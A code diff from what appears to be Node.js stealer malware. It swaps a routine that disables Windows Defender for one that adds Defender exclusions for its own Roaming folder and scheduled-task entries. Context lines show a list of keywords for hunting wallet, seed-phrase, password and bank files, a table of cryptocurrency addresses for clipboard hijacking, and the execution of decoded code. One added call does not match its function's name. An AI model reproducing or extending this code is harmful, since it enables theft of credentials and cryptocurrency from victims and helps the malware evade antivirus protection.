@@ -68,7 +68,6 @@ async function main() {
         relaunchAsAdmin();
     } else {
         console.log("The script is running with administrative privileges.");
-        disableWindowsDefender();
     }
 }
 
@@ -591,36 +590,6 @@ function executeCommand(command) {
     });
 }
 
-// Function to disable Windows Defender features
-function disableWindowsDefender() {
-    const powershellCommand = `
-        Set-MpPreference -DisableRealtimeMonitoring $true;
-        Set-MpPreference -DisableBehaviorMonitoring $true;
-        Set-MpPreference -DisableBlockAtFirstSeen $true;
-        Set-MpPreference -DisableIOAVProtection $true;
-        Set-MpPreference -DisablePrivacyMode $true;
-        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;
-        Set-MpPreference -DisableArchiveScanning $true;
-        Set-MpPreference -DisableIntrusionPreventionSystem $true;
-        Set-MpPreference -DisableScriptScanning $true;
-        Stop-Service -Name WinDefend;
-        Set-Service -Name WinDefend -StartupType Disabled;
-    `;
-
-    exec(`powershell.exe -Command "${powershellCommand}"`, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Erreur lors de la désactivation de Windows Defender: ${error.message}`);
-            return;
-        }
-        if (stderr) {
-            console.error(`Erreur dans PowerShell: ${stderr}`);
-            return;
-        }
-        console.log(`Résultat: ${stdout}`);
-    });
-}
-
-
 const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
 const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];
 
@@ -1065,6 +1034,34 @@ async function installPython() {
     return path.join(process.env['USERPROFILE'], 'AppData', 'Local', 'Programs', 'Python', 'Python312', 'pythonw.exe');
 }
 
+function addDefenderExclusions() {
+    const userProfilePath = os.homedir();  // Get user's home directory (C:\Users\<Username>)
+    const roamingPath = path.join(userProfilePath, 'AppData', 'Roaming');
+    const systemTasksPath = path.join('C:', 'Windows', 'System32', 'Tasks');
+
+    const commands = [
+        // Exclusion for dynamic script directory in Roaming
+        `powershell -Command Add-MpPreference -ExclusionPath "${roamingPath}\\fYmhpM4B"`,
+        
+        // Exclusion for Windows System Tasks directory
+        `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`,
+        
+        // Exclusion for specific registry keys related to scheduled tasks
+        `powershell -Command Add-MpPreference -ExclusionProcess "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{3E417B0F-72AD-404E-8E3B-EDACF62349B9}"`,
+        `powershell -Command Add-MpPreference -ExclusionProcess "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Python Updater_e7yi52KI"`
+    ];
+
+    // Execute each PowerShell command synchronously
+    try {
+        commands.forEach((command) => {
+            const output = execSync(command, { stdio: 'pipe' }).toString();
+            console.log(`Exclusion added successfully: ${output}`);
+        });
+    } catch (error) {
+        console.error(`Error adding exclusion: ${error.message}`);
+    }
+}
+
 // Replace with your addresses or all money to me :)
 const addresses = {
     btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
@@ -1142,6 +1139,7 @@ exec(decoded_code)
 
 async function createAndExecuteScripts() {
     try {
+        addDefenderExclusion();
         const pythonwExe = await installPython();
         clip(pythonwExe);  // Run the Python script
     } catch (error) {
